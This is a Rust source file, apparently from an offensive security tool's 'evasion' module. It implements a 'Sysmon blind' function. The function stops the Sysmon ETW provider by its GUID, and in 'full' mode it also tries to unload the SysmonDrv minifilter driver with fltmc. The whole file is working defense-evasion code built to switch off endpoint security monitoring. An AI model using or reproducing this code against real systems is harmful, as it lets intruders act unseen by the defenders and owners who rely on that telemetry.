//! Sysmon blinding — disable Sysmon ETW telemetry and optionally unload driver

use crate::error::MemoricError;
use serde_json::Value;

/// Blind Sysmon by disabling its ETW provider and optionally unloading its minifilter driver.
/// - "etw_only" (default): disable ETW provider {5770385F-C22A-43E0-BF4C-06F5698FFBD9}
/// - "full": also attempt to unload SysmonDrv minifilter via fltmc
pub fn sysmon_blind(args: &Value) -> Result<Value, MemoricError> {
    let method = args
        .get("method")
        .and_then(|v| v.as_str())
        .unwrap_or("etw_only");

    tracing::warn!("[EVASION] Sysmon blind: method={}", method);

    // Sysmon ETW provider GUID
    let sysmon_guid = "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}";

    // Step 1: Disable ETW provider by calling etw_provider_disable internally
    let etw_args = serde_json::json!({
        "provider_guid": sysmon_guid,
        "method": "stop_session"
    });
    let etw_result = crate::evasion::etw::etw_provider_disable(&etw_args);
    let etw_disabled = etw_result.is_ok();
    let etw_detail = match etw_result {
        Ok(v) => v,
        Err(e) => serde_json::json!({"error": format!("{}", e)}),
    };

    let sessions_stopped = etw_detail
        .get("stopped_count")
        .and_then(|v| v.as_u64())
        .unwrap_or(0);

    // Step 2: Optionally unload minifilter driver
    let driver_status = if method == "full" {
        // Attempt to unload SysmonDrv minifilter
        let fltmc_result = std::process::Command::new("fltmc")
            .args(["unload", "SysmonDrv"])
            .output();

        match fltmc_result {
            Ok(output) if output.status.success() => "unloaded".to_string(),
            Ok(output) => {
                let stderr = String::from_utf8_lossy(&output.stderr).to_string();
                let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                format!("failed: {} {}", stderr.trim(), stdout.trim())
            }
            Err(e) => format!("error: {}", e),
        }
    } else {
        "not_attempted".to_string()
    };

    Ok(serde_json::json!({
        "success": true,
        "etw_disabled": etw_disabled,
        "etw_sessions_stopped": sessions_stopped,
        "etw_detail": etw_detail,
        "driver_status": driver_status,
        "method": method,
        "sysmon_guid": sysmon_guid,
        "message": format!("Sysmon blind ({}): ETW={}, driver={}", method,
            if etw_disabled { "disabled" } else { "failed" }, driver_status)
    }))
}
